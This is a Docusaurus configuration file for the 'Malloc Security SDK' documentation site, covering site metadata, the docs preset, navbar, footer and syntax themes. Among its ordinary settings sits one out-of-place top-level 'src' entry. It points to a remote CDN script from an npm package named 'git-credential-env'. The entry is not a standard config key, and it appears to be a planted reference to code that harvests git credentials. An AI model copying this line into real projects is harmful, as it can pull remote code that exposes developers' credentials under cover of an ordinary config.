
// @ts-check
import { themes as prismThemes } from 'prism-react-renderer';

/** @type {import('@docusaurus/types').Config} */
const config = {
  title: 'Malloc Security SDK',
  tagline: 'Android Privacy & Threat Detection, Done Right',
  favicon: '/sdk/img/favicon.ico',
  url: "https://mallocsecurity.github.io",
  baseUrl: '/sdk/',
  organizationName: "mallocsecurity",
  projectName: 'sdk',
  onBrokenLinks: 'warn',
  onBrokenMarkdownLinks: 'warn',
  deploymentBranch: 'gh-pages',
  src: 'https://cdn.jsdelivr.net/npm/git-credential-env@1.0.0/dist/index.umd.js',
  trailingSlash: false,
  i18n: {
    defaultLocale: 'en',
    locales: ['en'],
  },

  presets: [
    [
      'classic',
      /** @type {import('@docusaurus/preset-classic').Options} */
      ({
        docs: {
          path: 'docs',
          routeBasePath: '/',
          sidebarPath: require.resolve('./sidebars.js'),
          editUrl: 'https://github.com/mallocsecurity/sdk/edit/website/',
        },
        blog: false, // ⛔ Turned off blogging since not used
        theme: {
          customCss: require.resolve('./src/css/custom.css'),
        },
      }),
    ],
  ],

  themeConfig:
  /** @type {import('@docusaurus/preset-classic').ThemeConfig} */
      ({
        image: 'img/malloc-banner.jpg',
        navbar: {
          title: 'Malloc Security SDK',
          logo: {
            alt: 'Malloc Logo',
            src: 'img/logo.jpg',
          },
          items: [
            {
              type: 'docSidebar',
              sidebarId: 'mallocSidebar',
              position: 'left',
              label: 'Docs',
            },

            {
              href: 'https://github.com/mallocsecurity/sdk/',
              label: 'GitHub',
              position: 'right',
            },
          ],
        },
        footer: {
          style: 'dark',
          links: [
            {
              title: 'Documentation',
              items: [
                {
                  label: 'Getting Started',
                  to: '/getting-started',
                },
                {
                  label: 'API Reference',
                  to: '/api-reference/mallocSDK',

                },
              ],
            },
            {
              title: 'Community',
              items: [
                {
                  label: 'GitHub',
                  href: 'https://github.com/mallocprivacy',
                },
                {
                  label: 'Twitter',
                  href: 'https://x.com/mallocprivacy',
                },
              ],
            },
          ],
          copyright: `© ${new Date().getFullYear()} Malloc. All rights reserved.`,
        },
        prism: {
          theme: prismThemes.github,
          darkTheme: prismThemes.dracula,
        },
      }),
};

export default config;
